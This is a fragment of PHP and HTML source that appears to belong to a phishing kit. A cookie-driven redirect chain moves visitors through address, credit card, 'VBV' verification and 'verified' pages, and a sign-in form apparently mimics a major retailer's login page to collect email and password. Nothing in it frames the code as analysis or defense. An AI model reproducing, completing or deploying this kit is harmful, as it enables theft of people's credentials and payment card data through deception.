...
if($invalid_credentials){ header("location:index.php?invalid_login"); }else { header('location:submit_login.php'); }
}
$cookie_name = 'SES';
if(isset($_COOKIE[$cookie_name])) {
 
if($_COOKIE[$cookie_name] == "LOG"){ header("location:address_confirm.php"); }
if($_COOKIE[$cookie_name] == "BILL"){ header("location:creditcards_confirm.php"); }
if($_COOKIE[$cookie_name] == "VBV"){ header("location:review.php"); }
if($_COOKIE[$cookie_name] == "DONE"){ header("location:verified.php"); }
...
<?php } ?>
  ...
  <div class="a-section">
    ...
    <form name="signIn" method="post" novalidate action="" class="a-spacing-none">
      ...
      <div class="a-section">
        <div class="a-box"><div class="a-box-inner a-padding-extra-large">
          ...
          <div class="a-row a-spacing-base">
            ...
            <input type="email" maxlength="128" value="" id="ap_email" name="email" tabindex="1" class="a-input-text a-span12 auth-required-field">
          </div>
